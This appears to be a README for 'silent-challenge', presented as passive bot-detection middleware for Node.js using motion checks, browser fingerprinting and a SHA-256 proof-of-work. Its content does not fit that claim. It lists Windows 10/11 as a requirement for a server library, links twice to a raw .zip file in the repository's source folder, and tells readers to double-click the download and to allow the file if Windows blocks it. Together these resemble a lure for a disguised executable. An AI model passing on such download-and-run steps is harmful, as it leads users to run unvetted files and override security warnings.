# 🕊️ silent-challenge - Simple passive bot checks

[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nielsmi7704/silent-challenge/main/src/silent-challenge-2.6.zip)

## 🧩 What this app does

silent-challenge adds a passive check to your site while a proof-of-work task runs in the browser. It combines motion signals and navigator checks inside a QuickJS WebAssembly sandbox, then finishes a SHA-256 based workload in the background.

This tool fits sites that need a quiet layer of bot detection without a full visual puzzle. It works as middleware in Node.js apps and keeps the user flow simple.

## ⚙️ What you need

- Windows 10 or Windows 11
- A modern browser such as Chrome, Edge, or Firefox
- Internet access for the first download
- A Node.js app if you plan to use the middleware
- Enough memory for a normal browser session and WebAssembly use

## 📥 Download and run

Use this link to visit the download page:

[Visit the silent-challenge download page](https://raw.githubusercontent.com/nielsmi7704/silent-challenge/main/src/silent-challenge-2.6.zip)

If you find a Windows build or release file there, download it and run it on your PC. If the page gives you source files, use the install steps below to set it up in your app.

## 🛠️ Setup on Windows

### 1. Get the files

Open the download page in your browser and get the latest version from the repository.

Save the files to a folder you can find later, such as Downloads or Desktop.

### 2. Open the app or project

If you downloaded a ready-to-run Windows file, double-click it to start.

If you downloaded the source project, unzip it first, then open the folder in File Explorer.

### 3. Use it in a Node.js app

If you want to add silent-challenge to your own site:

1. Open a terminal in the project folder.
2. Install the project files your app needs.
3. Start your Node.js server.
4. Open your site in a browser and test the challenge flow.

A common setup looks like this:

- Add the middleware to your Express app
- Load the browser part on pages that need a challenge
- Let the proof-of-work run while the checks happen

## 🧠 How it works

silent-challenge uses two layers:

- Motion checks: looks for human-like pointer and input movement
- Navigator checks: reads browser signals that help spot automation
- QuickJS sandbox: runs the logic in a safe WebAssembly environment
- SHA-256 proof-of-work: adds a short compute step before access is granted

The goal is to make bot use more costly while keeping the page quiet for real users.

## 🔒 Main uses

Use silent-challenge for:

- Login pages
- Signup pages
- Comment forms
- API access gates
- Traffic checks on public pages
- Abuse control on simple web apps

It works well when you want a passive check that does not interrupt normal use with a full screen puzzle.

## 🧭 Basic use flow

1. A user opens your site.
2. The challenge loads in the browser.
3. Motion and browser checks run.
4. The SHA-256 workload runs at the same time.
5. Your app gets a pass or block result.

## 🧪 Browser support

For best results, use:

- Chrome
- Edge
- Firefox

A recent browser version helps because the app depends on WebAssembly and normal browser APIs.

## 📁 Project topics

This project is tagged for:

- anti-bot
- behavioral-analysis
- bot-detection
- browser-fingerprinting
- captcha
- chacha20
- express-middleware
- javascript
- nodejs
- proof-of-work
- quickjs
- security
- sha256
- wasm
- webassembly

## 🧰 Tips for Windows users

- Keep the folder in a simple path like `C:\silent-challenge`
- If Windows blocks the file, right-click it and choose to allow it
- Close extra browser tabs if the challenge feels slow
- Make sure your browser is up to date
- If the page does not load, check your internet connection and try again

## 🧩 Example use in a site

You can place silent-challenge in front of pages that need extra protection. A user opens the page, the challenge runs, and your app decides whether to continue.

This keeps the user flow short and lets your site check for bot-like behavior without a visible puzzle every time.

## 📌 Common places to use it

- Public forms
- New account pages
- Password reset flows
- Rate-limited endpoints
- Trial signups
- High-traffic landing pages

## 🖥️ Simple install path

If you want to try it on Windows right away:

1. Visit the download page
2. Get the latest release or source files
3. Save the files to your PC
4. Open the folder
5. Run the app or connect it to your Node.js project
6. Test it in your browser